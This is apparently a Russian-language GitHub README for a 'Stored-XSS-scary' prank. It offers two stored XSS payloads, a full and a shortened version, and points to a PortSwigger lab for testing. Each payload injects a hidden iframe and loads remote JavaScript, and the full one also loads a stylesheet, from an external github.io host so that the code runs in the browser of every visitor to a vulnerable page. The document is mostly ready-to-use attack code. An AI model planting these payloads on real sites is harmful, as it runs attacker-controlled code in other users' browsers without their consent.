# Stored-XSS-scary

Код сработает только при наличии уязвимости stored XSS + сайт не будет блокировать загрузку внешних скриптов и стилей. <br>
Для теста можно запустить лабараторку в https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded.

------------------------------------------

Полная версия (музыка + CSS + доп. JS скрипты) [445 символов]:
> <script>var f=document.createElement("iframe");f.src="/css/bootstrap.min.css";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s);var c=document.createElement('link');c.rel='stylesheet';c.href='//0-dayff13r.github.io/Stored-XSS-scary/styles.css';document.head.appendChild(c)};f.style.display="none"</script>

<br> Сокращенная версия (только музыка) [300 символов]:
> <script>var f=document.createElement("iframe");f.src="/css/bootstrap.min.css";document.body.appendChild(f);f.onload=function(){var s=document.createElement('script');s.src='//0-dayff13r.github.io/Stored-XSS-scary/start.js';f.contentWindow.document.head.appendChild(s)};f.style.display="none"</script>
